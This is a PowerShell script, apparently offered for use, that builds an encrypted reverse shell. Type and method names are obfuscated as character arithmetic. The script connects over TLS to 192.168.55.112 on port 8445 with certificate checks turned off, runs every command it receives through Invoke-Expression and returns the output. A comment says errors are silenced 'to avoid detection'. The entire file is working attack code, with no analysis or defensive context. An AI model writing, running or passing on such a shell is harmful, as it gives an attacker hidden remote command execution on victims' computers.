[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WgNbBYBVWmP = ([char](2 + 76) + [char](16 + 32 + 53) + [char](163 - 44) + [char](82 - 37) + [char](66 + 13) + [char](136 - 38) + [char](43 + 63) + [char](22 + 10 + 69) + [char](141 - 42) + [char](161 - 45))
$ouMULHhaPzqRlAV = ([char](14 + 69) + [char](221 - 50 - 50) + [char](2 + 35 + 78) + [char](216 - 50 - 50) + [char](201 - 50 - 50) + [char](21 + 88) + [char](146 - 50 - 50) + [char](123 - 45) + [char](201 - 50 - 50) + [char](216 - 50 - 50) + [char](25 + 21) + [char](1 + 8 + 74) + [char](211 - 50 - 50) + [char](199 - 50 - 50) + [char](207 - 50 - 50) + [char](135 - 34) + [char](216 - 50 - 50) + [char](27 + 37 + 51) + [char](23 + 23) + [char](8 + 35 + 41) + [char](45 + 54) + [char](122 - 10) + [char](114 - 47) + [char](56 + 52) + [char](1 + 44 + 60) + [char](99 + 2) + [char](34 + 2 + 74) + [char](216 - 50 - 50))
$uKqFMWUqOlWkxsVa = ([char](22 + 49) + [char](21 + 9 + 71) + [char](14 + 31 + 71) + [char](97 - 14) + [char](133 - 17) + [char](214 - 50 - 50) + [char](100 + 1) + [char](124 - 27) + [char](74 + 35))
$LcqhsQkhgAi = ([char](183 - 50 - 50) + [char](70 + 51) + [char](108 + 7) + [char](12 + 104) + [char](201 - 50 - 50) + [char](209 - 50 - 50) + [char](146 - 50 - 50) + [char](122 - 44) + [char](129 - 28) + [char](140 - 24) + [char](44 + 2) + [char](14 + 10 + 59) + [char](132 - 31) + [char](147 - 48) + [char](128 - 11) + [char](11 + 103) + [char](1 + 104) + [char](16 + 44 + 56) + [char](162 - 41) + [char](66 - 20) + [char](115 - 32) + [char](21 + 39 + 55) + [char](30 + 15 + 63) + [char](183 - 50 - 50) + [char](15 + 1 + 100) + [char](35 + 79) + [char](201 - 50 - 50) + [char](74 + 23) + [char](61 + 48))
$DhKQbGjUbqDN = ([char](34 + 31) + [char](217 - 50 - 50) + [char](29 + 87) + [char](153 - 49) + [char](89 + 12) + [char](64 + 46) + [char](26 + 30 + 60) + [char](22 + 28 + 55) + [char](135 - 36) + [char](16 + 81) + [char](4 + 34 + 78) + [char](201 - 50 - 50) + [char](83 - 18) + [char](125 - 10) + [char](167 - 50 - 50) + [char](208 - 50 - 50) + [char](205 - 50 - 50) + [char](26 + 27 + 48) + [char](85 + 25) + [char](216 - 50 - 50))
$iGtszSEsUJr = ([char](7 + 12 + 64) + [char](108 + 13) + [char](11 + 104) + [char](38 + 78) + [char](78 + 23) + [char](29 + 11 + 69) + [char](93 - 47) + [char](7 + 34 + 37) + [char](201 - 50 - 50) + [char](30 + 18 + 68) + [char](45 + 1) + [char](38 + 45) + [char](17 + 33 + 51) + [char](199 - 50 - 50) + [char](107 + 10) + [char](23 + 25 + 66) + [char](20 + 36 + 49) + [char](136 - 20) + [char](221 - 50 - 50) + [char](61 - 15) + [char](103 - 21) + [char](201 - 50 - 50) + [char](13 + 96) + [char](14 + 30 + 67) + [char](14 + 102) + [char](147 - 46) + [char](16 + 12 + 39) + [char](149 - 48) + [char](21 + 28 + 65) + [char](54 + 62) + [char](145 - 40) + [char](71 + 31) + [char](205 - 50 - 50) + [char](199 - 50 - 50) + [char](10 + 29 + 58) + [char](29 + 87) + [char](17 + 38 + 46) + [char](9 + 7 + 70) + [char](11 + 10 + 76) + [char](26 + 23 + 59) + [char](205 - 50 - 50) + [char](200 - 50 - 50) + [char](125 - 28) + [char](26 + 90) + [char](46 + 59) + [char](211 - 50 - 50) + [char](30 + 80) + [char](33 + 34) + [char](137 - 40) + [char](20 + 42 + 46) + [char](155 - 47) + [char](198 - 50 - 50) + [char](76 + 21) + [char](199 - 50 - 50) + [char](94 + 13))
$bOcpXYdCjfyfQ = ([char](13 + 30 + 40) + [char](221 - 50 - 50) + [char](215 - 50 - 50) + [char](142 - 26) + [char](17 + 24 + 60) + [char](209 - 50 - 50) + [char](35 + 11) + [char](113 - 40) + [char](20 + 9 + 50) + [char](76 - 30) + [char](18 + 4 + 61) + [char](13 + 28 + 75) + [char](65 + 49) + [char](32 + 6 + 63) + [char](18 + 17 + 62) + [char](149 - 40) + [char](18 + 26 + 43) + [char](214 - 50 - 50) + [char](11 + 41 + 53) + [char](140 - 24) + [char](66 + 35) + [char](44 + 70))
$A6TwNuHt5r = ([char](97 - 15) + [char](74 + 27) + [char](130 - 33) + [char](12 + 32 + 56))
$gbhzXhQqQ1C = ([char](8 + 19 + 60) + [char](35 + 79) + [char](33 + 7 + 65) + [char](21 + 3 + 92) + [char](201 - 50 - 50) + [char](176 - 50 - 50) + [char](29 + 9 + 67) + [char](31 + 79) + [char](89 + 12))
$KLFRktrURe = ([char](17 + 25 + 31) + [char](1 + 50 + 59) + [char](15 + 4 + 99) + [char](157 - 46) + [char](207 - 50 - 50) + [char](114 - 13) + [char](13 + 3 + 29) + [char](15 + 19 + 35) + [char](220 - 50 - 50) + [char](137 - 25) + [char](9 + 105) + [char](19 + 82) + [char](55 + 60) + [char](37 + 78) + [char](144 - 39) + [char](152 - 41) + [char](107 + 3))
$lSMMzghBde4W = ([char](73 + 6) + [char](158 - 41) + [char](12 + 6 + 98) + [char](68 - 23) + [char](120 - 37) + [char](66 + 50) + [char](214 - 50 - 50) + [char](45 + 60) + [char](8 + 102) + [char](150 - 47))
$1ui7ipMi33xgWZO = ([char](33 + 50) + [char](5 + 26 + 90) + [char](29 + 34 + 52) + [char](35 + 36 + 45) + [char](13 + 1 + 87) + [char](209 - 50 - 50) + [char](91 - 45) + [char](101 - 17) + [char](142 - 41) + [char](16 + 31 + 73) + [char](165 - 49) + [char](9 + 6 + 31) + [char](35 + 34) + [char](154 - 44) + [char](144 - 45) + [char](57 + 54) + [char](116 - 16) + [char](29 + 32 + 44) + [char](1 + 28 + 81) + [char](67 + 36))
$P2JPaMbCga4mreA = ([char](18 + 65) + [char](221 - 50 - 50) + [char](9 + 30 + 76) + [char](11 + 27 + 78) + [char](134 - 33) + [char](56 + 53) + [char](85 - 39) + [char](182 - 50 - 50) + [char](113 - 16) + [char](210 - 50 - 50) + [char](55 + 45) + [char](95 + 16) + [char](145 - 36))
$vkygTJziITxV = ([char](183 - 50 - 50) + [char](216 - 50 - 50) + [char](12 + 85) + [char](131 - 17) + [char](216 - 50 - 50) + [char](58 - 13) + [char](100 - 17) + [char](208 - 50 - 50) + [char](137 - 36) + [char](12 + 89) + [char](126 - 14))
$LgNzzmiE69o = ([char](14 + 6 + 47) + [char](7 + 14 + 87) + [char](25 + 27 + 59) + [char](137 - 22) + [char](112 - 11))
$yKVHzpzreR = ([char](1 + 66) + [char](147 - 39) + [char](49 + 62) + [char](148 - 33) + [char](113 - 12))
$kQiJjQYQoKLQm = ([char](6 + 4 + 57) + [char](208 - 50 - 50) + [char](6 + 48 + 57) + [char](28 + 24 + 63) + [char](201 - 50 - 50))


if ((-not $LcqhsQkhgAi) -or (-not $ouMULHhaPzqRlAV) -or (-not $iGtszSEsUJr)) {
    exit
}

try {
    # 1. Setup connection parameters
    $tRYxqU8Okk0UutHP = "192.168.55.112"
    $A7bvh2dttBQ = 8445

    # 2. Buat koneksi TCP
    $ouMULHhaPzqRlAV = & $WgNbBYBVWmP $ouMULHhaPzqRlAV($tRYxqU8Okk0UutHP, $A7bvh2dttBQ)
    $9jZ5uLO596TRZ = $ouMULHhaPzqRlAV.$uKqFMWUqOlWkxsVa()

    # 3. Bungkus TCP dengan TLS/SSL
    $ysHSegjXiZfWlnf = { $true } -as $iGtszSEsUJr
    $LcqhsQkhgAi = & $WgNbBYBVWmP $LcqhsQkhgAi($9jZ5uLO596TRZ, $false, $ysHSegjXiZfWlnf)

    # 4. Authenticate sebagai TLS client (ignore certificate validation)
    $LcqhsQkhgAi.$DhKQbGjUbqDN($tRYxqU8Okk0UutHP, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)

    # 5. Setup writer untuk output
    $hrBxLCizNEkx1 = & $WgNbBYBVWmP $bOcpXYdCjfyfQ($LcqhsQkhgAi)
    $hrBxLCizNEkx1.AutoFlush = $true

    # 6. Buffer untuk input
    [byte[]]$8MlrN07kM3j3l = New-Object byte[] 4096

    while ($true) {
        # Baca command melalui SSL stream
        $gKqbxPcG5Gs = $LcqhsQkhgAi.$A6TwNuHt5r($8MlrN07kM3j3l, 0, $8MlrN07kM3j3l.Length)
        if ($gKqbxPcG5Gs -le 0) { break }

        $mPiRqlGPtiTCYHq = [System.Text.Encoding]::UTF8.GetString($8MlrN07kM3j3l, 0, $gKqbxPcG5Gs).Trim()

        if ($mPiRqlGPtiTCYHq.Length -gt 0) {
            # Eksekusi command dengan error handling
            $TGamHZIRrKuBaWRU = try {
                ( & $KLFRktrURe $mPiRqlGPtiTCYHq 2>&1 | & $lSMMzghBde4W ).Trim()
            } catch {
                ($_ | & $lSMMzghBde4W ).Trim()
            }

            if ([string]::IsNullOrWhiteSpace($TGamHZIRrKuBaWRU)) {
                $TGamHZIRrKuBaWRU = "[+] Command executed successfully (no output)"
            }

            # Kirim balik hasil melalui encrypted channel
            $hrBxLCizNEkx1.$gbhzXhQqQ1C($TGamHZIRrKuBaWRU + "`n---END---`n")
        }

        

    }

} catch {
    # Silent error handling - no output to avoid detection
} finally {
    # Cleanup resources
    if ($hrBxLCizNEkx1) { $hrBxLCizNEkx1.$LgNzzmiE69o() }
    if ($LcqhsQkhgAi) { $LcqhsQkhgAi.$yKVHzpzreR() }
    if ($ouMULHhaPzqRlAV) { $ouMULHhaPzqRlAV.$kQiJjQYQoKLQm() }
}
